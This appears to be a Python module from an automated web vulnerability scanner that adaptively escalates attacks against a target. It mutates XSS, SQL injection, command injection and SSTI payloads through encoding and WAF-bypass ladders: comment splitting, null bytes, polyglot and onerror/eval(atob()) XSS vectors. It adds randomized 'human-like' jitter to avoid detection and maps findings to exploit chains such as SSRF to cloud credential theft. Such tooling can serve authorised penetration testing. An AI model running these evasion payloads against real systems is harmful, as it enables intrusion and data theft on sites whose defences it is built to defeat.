"""
adaptive_engine.py — Adaptive Escalation Engine
================================================
Scanners must EVOLVE dynamically based on target responses.

Pipeline:
    probe → observe → mutate → retry → escalate

Example:
    XSS blocked → encoding mutation → DOM vector → success

Features:
- Probe result evaluation
- WAF bypass strategy selection
- Encoding escalation ladder
- DOM vector fallback
- Context-adaptive mutation
- Escalation scoring (stop when confident)
- Strategy history tracking (avoid loops)
"""

from __future__ import annotations

import asyncio
import logging
import random
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple

try:
    from .analyzer import AnalysisVerdict, DiffResult
except ImportError:
    from analyzer import AnalysisVerdict, DiffResult  # type: ignore[no-redef]

_logger = logging.getLogger("enterprise.adaptive")


# ─────────────────────────────────────────────
# Escalation strategies
# ─────────────────────────────────────────────
class EscalationStrategy(str, Enum):
    # Encoding escalations
    URL_ENCODE = "url_encode"
    DOUBLE_URL_ENCODE = "double_url_encode"
    HTML_ENCODE = "html_encode"
    UNICODE_ESCAPE = "unicode_escape"
    BASE64 = "base64"
    HEX_ENCODE = "hex_encode"

    # Case mutation
    CASE_MUTATION = "case_mutation"
    MIXED_CASE = "mixed_case"

    # Whitespace bypass
    WHITESPACE_BYPASS = "whitespace_bypass"
    COMMENT_BYPASS = "comment_bypass"
    NULL_BYTE = "null_byte_inject"

    # DOM vectors
    DOM_VECTOR = "dom_vector"
    DOM_CLOBBERING = "dom_clobbering"
    PROTOTYPE_POLLUTION = "prototype_pollution"

    # Injection bypass
    POLYGLOT = "polyglot"
    SECOND_ORDER = "second_order"
    OUT_OF_BAND = "out_of_band"
    BLIND_TIMING = "blind_timing"

    # Context switches
    CONTEXT_SWITCH = "context_switch"
    PARAMETER_POLLUTION = "parameter_pollution"
    JSON_ESCAPE = "json_escape"

    # Obfuscation
    CONCATENATION = "concatenation"
    DYNAMIC_EVAL = "dynamic_eval"
    STRING_REVERSE = "string_reverse"


class EscalationOutcome(str, Enum):
    SUCCESS = "success"          # Confirmed vulnerability
    PARTIAL = "partial"          # Some signal, continue escalating
    BLOCKED = "blocked"          # WAF blocked — try bypass
    CLEAN = "clean"              # No signal — wrong vector
    EXHAUSTED = "exhausted"      # All strategies tried


@dataclass
class EscalationStep:
    """One step in the escalation sequence."""
    strategy: EscalationStrategy
    original_payload: str
    mutated_payload: str
    outcome: EscalationOutcome = EscalationOutcome.PARTIAL
    confidence: float = 0.0
    verdict: AnalysisVerdict = AnalysisVerdict.INCONCLUSIVE
    evidence: Dict[str, Any] = field(default_factory=dict)
    attempt_number: int = 0
    timestamp: float = field(default_factory=time.time)


@dataclass
class EscalationResult:
    """Final result of the adaptive escalation process."""
    succeeded: bool = False
    winning_payload: Optional[str] = None
    winning_strategy: Optional[EscalationStrategy] = None
    confidence: float = 0.0
    verdict: AnalysisVerdict = AnalysisVerdict.INCONCLUSIVE
    steps_taken: int = 0
    strategies_tried: List[EscalationStrategy] = field(default_factory=list)
    steps: List[EscalationStep] = field(default_factory=list)
    total_time_ms: float = 0.0
    waf_bypassed: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return {
            "succeeded": self.succeeded,
            "winning_payload": self.winning_payload,
            "winning_strategy": self.winning_strategy.value if self.winning_strategy else None,
            "confidence": self.confidence,
            "verdict": self.verdict.value,
            "steps": self.steps_taken,
            "strategies": [s.value for s in self.strategies_tried],
            "time_ms": self.total_time_ms,
            "waf_bypassed": self.waf_bypassed,
        }


# ─────────────────────────────────────────────
# Payload mutators for escalation
# ─────────────────────────────────────────────
class _EscalationMutator:
    """Applies specific escalation strategies to payloads."""

    @staticmethod
    def apply(strategy: EscalationStrategy, payload: str) -> str:
        fn = getattr(_EscalationMutator, f"_apply_{strategy.value}", None)
        if fn:
            return fn(payload)
        return payload

    @staticmethod
    def _apply_url_encode(p: str) -> str:
        from urllib.parse import quote
        return quote(p, safe="")

    @staticmethod
    def _apply_double_url_encode(p: str) -> str:
        from urllib.parse import quote
        return quote(quote(p, safe=""), safe="")

    @staticmethod
    def _apply_html_encode(p: str) -> str:
        result = ""
        for ch in p:
            result += f"&#{ord(ch)};"
        return result

    @staticmethod
    def _apply_unicode_escape(p: str) -> str:
        return "".join(f"\\u{ord(c):04x}" if ord(c) > 31 else c for c in p)

    @staticmethod
    def _apply_base64(p: str) -> str:
        import base64
        # Used in SQL contexts: CONVERT(FROM_BASE64(...))
        b64 = base64.b64encode(p.encode()).decode()
        return f"FROM_BASE64('{b64}')"

    @staticmethod
    def _apply_hex_encode(p: str) -> str:
        return "0x" + p.encode("utf-8").hex()

    @staticmethod
    def _apply_case_mutation(p: str) -> str:
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p))

    @staticmethod
    def _apply_mixed_case(p: str) -> str:
        return "".join(
            c.upper() if random.random() > 0.5 else c.lower() for c in p
        )

    @staticmethod
    def _apply_whitespace_bypass(p: str) -> str:
        whitespace_variants = ["/**/", "%09", "%0a", "%0d", "+", "%20%20"]
        replacer = random.choice(whitespace_variants)
        return p.replace(" ", replacer)

    @staticmethod
    def _apply_comment_bypass(p: str) -> str:
        # Insert SQL comments between keywords
        result = p
        for kw in ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DROP"]:
            result = result.replace(kw, f"{kw[:len(kw)//2]}/**/{ kw[len(kw)//2:]}")
        return result

    @staticmethod
    def _apply_null_byte_inject(p: str) -> str:
        return p + "\x00"

    @staticmethod
    def _apply_dom_vector(p: str) -> str:
        # Convert inline XSS to DOM-based vector
        if "<script>" in p:
            return p.replace("<script>", "<img src=x onerror=").replace("</script>", ">")
        return f"<img src=x onerror=\"eval(atob('{__import__('base64').b64encode(p.encode()).decode()}'))\">"

    @staticmethod
    def _apply_polyglot(p: str) -> str:
        return f"\"><img src=x onerror=alert(1)>'\">{p}<!--"

    @staticmethod
    def _apply_concatenation(p: str) -> str:
        # SQL concat bypass: 'se'+'lect' or CONCAT(...)
        if "SELECT" in p.upper():
            return p.replace("SELECT", "SE'||'LECT")
        return f"CONCAT({','.join(repr(c) for c in p)})"

    @staticmethod
    def _apply_string_reverse(p: str) -> str:
        rev = p[::-1]
        return f"REVERSE('{rev}')"

    @staticmethod
    def _apply_json_escape(p: str) -> str:
        return p.replace('"', '\\"').replace("'", "\\'").replace("<", "\\u003c").replace(">", "\\u003e")

    @staticmethod
    def _apply_parameter_pollution(p: str) -> str:
        return f"{p}&id={p}"

    @staticmethod
    def _apply_context_switch(p: str) -> str:
        # Switch from inline to event handler XSS
        return f"\" onmouseover=\"{p}\" x=\""


# ─────────────────────────────────────────────
# Strategy selection based on context/feedback
# ─────────────────────────────────────────────
class StrategySelector:
    """
    Selects escalation strategies based on:
    - Vulnerability type (XSS, SQLi, CMDI, etc.)
    - Previous attempt outcomes
    - WAF detection signals
    - Current escalation depth
    """

    # Ordered escalation ladders per vulnerability type
    _LADDERS: Dict[str, List[EscalationStrategy]] = {
        "xss": [
            EscalationStrategy.HTML_ENCODE,
            EscalationStrategy.UNICODE_ESCAPE,
            EscalationStrategy.URL_ENCODE,
            EscalationStrategy.DOM_VECTOR,
            EscalationStrategy.POLYGLOT,
            EscalationStrategy.CASE_MUTATION,
            EscalationStrategy.DOM_CLOBBERING,
            EscalationStrategy.CONTEXT_SWITCH,
            EscalationStrategy.DOUBLE_URL_ENCODE,
        ],
        "sqli": [
            EscalationStrategy.WHITESPACE_BYPASS,
            EscalationStrategy.COMMENT_BYPASS,
            EscalationStrategy.CASE_MUTATION,
            EscalationStrategy.URL_ENCODE,
            EscalationStrategy.HEX_ENCODE,
            EscalationStrategy.BASE64,
            EscalationStrategy.CONCATENATION,
            EscalationStrategy.STRING_REVERSE,
            EscalationStrategy.BLIND_TIMING,
            EscalationStrategy.SECOND_ORDER,
        ],
        "cmdi": [
            EscalationStrategy.URL_ENCODE,
            EscalationStrategy.DOUBLE_URL_ENCODE,
            EscalationStrategy.NULL_BYTE,
            EscalationStrategy.WHITESPACE_BYPASS,
            EscalationStrategy.BLIND_TIMING,
            EscalationStrategy.OUT_OF_BAND,
        ],
        "ssti": [
            EscalationStrategy.URL_ENCODE,
            EscalationStrategy.UNICODE_ESCAPE,
            EscalationStrategy.CASE_MUTATION,
            EscalationStrategy.CONTEXT_SWITCH,
            EscalationStrategy.POLYGLOT,
        ],
        "ssrf": [
            EscalationStrategy.URL_ENCODE,
            EscalationStrategy.DOUBLE_URL_ENCODE,
            EscalationStrategy.UNICODE_ESCAPE,
            EscalationStrategy.OUT_OF_BAND,
            EscalationStrategy.BLIND_TIMING,
        ],
        "default": [
            EscalationStrategy.URL_ENCODE,
            EscalationStrategy.HTML_ENCODE,
            EscalationStrategy.CASE_MUTATION,
            EscalationStrategy.WHITESPACE_BYPASS,
            EscalationStrategy.POLYGLOT,
            EscalationStrategy.DOUBLE_URL_ENCODE,
        ],
    }

    # WAF bypass overrides — when WAF detected, try these first
    _WAF_BYPASS_STRATEGIES: List[EscalationStrategy] = [
        EscalationStrategy.URL_ENCODE,
        EscalationStrategy.DOUBLE_URL_ENCODE,
        EscalationStrategy.NULL_BYTE,
        EscalationStrategy.UNICODE_ESCAPE,
        EscalationStrategy.WHITESPACE_BYPASS,
        EscalationStrategy.COMMENT_BYPASS,
        EscalationStrategy.CASE_MUTATION,
    ]

    def get_ladder(
        self,
        vuln_type: str,
        waf_detected: bool = False,
        tried: Optional[List[EscalationStrategy]] = None,
    ) -> List[EscalationStrategy]:
        tried_set = set(tried or [])
        if waf_detected:
            ladder = self._WAF_BYPASS_STRATEGIES + self._LADDERS.get(
                vuln_type, self._LADDERS["default"]
            )
        else:
            ladder = self._LADDERS.get(vuln_type, self._LADDERS["default"])
        # Remove already tried strategies
        return [s for s in ladder if s not in tried_set]


# ─────────────────────────────────────────────
# Adaptive Escalation Engine
# ─────────────────────────────────────────────
class AdaptiveEscalationEngine:
    """
    Orchestrates the probe → observe → mutate → retry → escalate cycle.

    Usage:
        engine = AdaptiveEscalationEngine(probe_fn, vuln_type="xss")
        result = await engine.escalate(base_payload, target_url, parameter)
        if result.succeeded:
            # Found bypass
    """

    MAX_ESCALATION_STEPS: int = 12
    CONFIDENCE_SUCCESS_THRESHOLD: float = 0.75
    CONFIDENCE_STOP_THRESHOLD: float = 0.85  # Stop early if very confident
    MIN_JITTER_MS: float = 100.0
    MAX_JITTER_MS: float = 500.0

    def __init__(
        self,
        probe_fn: Callable[..., Any],  # async fn(url, payload, param) -> (DiffResult, snapshot)
        vuln_type: str = "default",
        max_steps: int = MAX_ESCALATION_STEPS,
    ):
        self._probe = probe_fn
        self._vuln_type = vuln_type
        self._max_steps = max_steps
        self._selector = StrategySelector()
        self._history: List[EscalationStep] = []

    async def escalate(
        self,
        base_payload: str,
        url: str,
        parameter: str = "",
        waf_detected: bool = False,
        **probe_kwargs,
    ) -> EscalationResult:
        """
        Main escalation loop.

        1. Get strategy ladder (ordered by effectiveness)
        2. Apply each strategy → mutate payload
        3. Probe target with mutated payload
        4. Evaluate response
        5. Stop if success threshold reached
        6. Continue to next strategy if blocked/partial
        """
        start = time.monotonic()
        tried_strategies: List[EscalationStrategy] = []
        current_payload = base_payload
        waf_bypassed = False

        for step_num in range(self._max_steps):
            ladder = self._selector.get_ladder(
                self._vuln_type, waf_detected=waf_detected, tried=tried_strategies
            )
            if not ladder:
                _logger.info(f"All strategies exhausted after {step_num} steps")
                break

            strategy = ladder[0]
            tried_strategies.append(strategy)
            mutated = _EscalationMutator.apply(strategy, current_payload)

            _logger.debug(
                f"Escalation step {step_num + 1}/{self._max_steps}: "
                f"strategy={strategy.value} payload={mutated[:60]!r}"
            )

            # Human-like jitter
            await asyncio.sleep(random.uniform(self.MIN_JITTER_MS, self.MAX_JITTER_MS) / 1000)

            # Execute probe
            try:
                diff_result: DiffResult = await self._probe(
                    url=url,
                    payload=mutated,
                    parameter=parameter,
                    **probe_kwargs,
                )
            except Exception as exc:
                _logger.warning(f"Probe error at step {step_num}: {exc}")
                step = EscalationStep(
                    strategy=strategy,
                    original_payload=current_payload,
                    mutated_payload=mutated,
                    outcome=EscalationOutcome.PARTIAL,
                    attempt_number=step_num + 1,
                    evidence={"error": str(exc)},
                )
                self._history.append(step)
                continue

            # Evaluate outcome
            outcome, step_confidence = self._evaluate(diff_result, waf_detected)
            waf_detected = waf_detected or (
                diff_result.waf_signals is not None and len(diff_result.waf_signals) > 0
            )
            if outcome == EscalationOutcome.BLOCKED and not waf_bypassed:
                waf_detected = True  # confirmed WAF — switch to WAF bypass ladder

            if outcome == EscalationOutcome.SUCCESS and not waf_bypassed and waf_detected:
                waf_bypassed = True

            step = EscalationStep(
                strategy=strategy,
                original_payload=current_payload,
                mutated_payload=mutated,
                outcome=outcome,
                confidence=step_confidence,
                verdict=diff_result.verdict,
                evidence=diff_result.evidence if hasattr(diff_result, "evidence") else {},
                attempt_number=step_num + 1,
            )
            self._history.append(step)

            # Check early exit
            if outcome == EscalationOutcome.SUCCESS:
                elapsed = (time.monotonic() - start) * 1000
                return EscalationResult(
                    succeeded=True,
                    winning_payload=mutated,
                    winning_strategy=strategy,
                    confidence=step_confidence,
                    verdict=diff_result.verdict,
                    steps_taken=step_num + 1,
                    strategies_tried=tried_strategies,
                    steps=self._history,
                    total_time_ms=elapsed,
                    waf_bypassed=waf_bypassed,
                )

            if outcome == EscalationOutcome.CLEAN:
                # Wrong vector entirely — no point escalating further on this type
                break

            # Use mutated payload as basis for next escalation (progressive escalation)
            if outcome == EscalationOutcome.PARTIAL:
                current_payload = mutated

        # All strategies exhausted
        best_step = max(self._history, key=lambda s: s.confidence, default=None)
        elapsed = (time.monotonic() - start) * 1000
        return EscalationResult(
            succeeded=False,
            winning_payload=best_step.mutated_payload if best_step else None,
            winning_strategy=best_step.strategy if best_step else None,
            confidence=best_step.confidence if best_step else 0.0,
            verdict=best_step.verdict if best_step else AnalysisVerdict.INCONCLUSIVE,
            steps_taken=len(self._history),
            strategies_tried=tried_strategies,
            steps=self._history,
            total_time_ms=elapsed,
            waf_bypassed=waf_bypassed,
        )

    def _evaluate(
        self,
        diff_result: DiffResult,
        waf_was_detected: bool,
    ) -> Tuple[EscalationOutcome, float]:
        """Classify a DiffResult into an EscalationOutcome."""
        verdict = diff_result.verdict

        if verdict == AnalysisVerdict.VULNERABLE:
            return EscalationOutcome.SUCCESS, diff_result.confidence

        if verdict == AnalysisVerdict.LIKELY_VULNERABLE:
            if diff_result.confidence >= self.CONFIDENCE_SUCCESS_THRESHOLD:
                return EscalationOutcome.SUCCESS, diff_result.confidence
            return EscalationOutcome.PARTIAL, diff_result.confidence

        if verdict == AnalysisVerdict.WAF_FILTERED:
            return EscalationOutcome.BLOCKED, 0.0

        if verdict == AnalysisVerdict.CLEAN:
            return EscalationOutcome.CLEAN, 0.0

        # SUSPICIOUS or INCONCLUSIVE
        return EscalationOutcome.PARTIAL, diff_result.confidence

    def reset(self) -> None:
        """Reset history for reuse."""
        self._history.clear()

    @property
    def history(self) -> List[EscalationStep]:
        return self._history


# ─────────────────────────────────────────────
# Attack chain correlator
# ─────────────────────────────────────────────
class AttackChainCorrelator:
    """
    Combines individual findings into multi-step exploit chains.

    Example:
        IDOR + weak CSP + open redirect = account takeover

    Stores relationships for Neo4j ingestion.
    """

    CHAIN_COMBOS: List[Tuple[List[str], str, str]] = [
        (["idor", "open_redirect"], "Account Takeover via IDOR + Redirect", "A01+A07"),
        (["xss", "weak_csp"], "CSP Bypass enabling persistent XSS", "A03+A05"),
        (["sqli", "broken_access"], "SQL Injection enabling privilege escalation", "A03+A01"),
        (["ssrf", "cloud_metadata"], "SSRF to cloud credential theft", "A10+A02"),
        (["weak_jwt", "idor"], "JWT forgery enabling IDOR exploitation", "A07+A01"),
        (["path_traversal", "rce"], "Path traversal to Remote Code Execution", "A01+A03"),
        (["xxe", "ssrf"], "XXE chained to SSRF for internal access", "A03+A10"),
        (["mass_assignment", "privilege_escalation"], "Mass assignment privilege escalation", "A04+A01"),
        (["open_redirect", "phishing"], "Open redirect enabling credential phishing", "A01+A07"),
        (["ssti", "rce"], "Server-side template injection leading to RCE", "A03"),
    ]

    def correlate(
        self, findings: List[Dict[str, Any]]
    ) -> List[Dict[str, Any]]:
        """Identify attack chains from a list of findings."""
        chains = []
        tags_by_id: Dict[str, List[str]] = {
            f.get("id", ""): [t.lower() for t in f.get("tags", [])]
            for f in findings
        }

        for trigger_tags, chain_name, owasp_combo in self.CHAIN_COMBOS:
            matching_ids = []
            for fid, ftags in tags_by_id.items():
                if any(t in ftags for t in trigger_tags):
                    matching_ids.append(fid)

            if len(matching_ids) >= 2:
                chain_id = f"chain-{len(chains)+1:03d}"
                chains.append({
                    "chain_id": chain_id,
                    "name": chain_name,
                    "owasp": owasp_combo,
                    "finding_ids": matching_ids,
                    "severity": "critical",
                    "description": (
                        f"Attack chain detected: {chain_name}. "
                        f"Combined exploitation of {len(matching_ids)} vulnerabilities."
                    ),
                })

        return chains
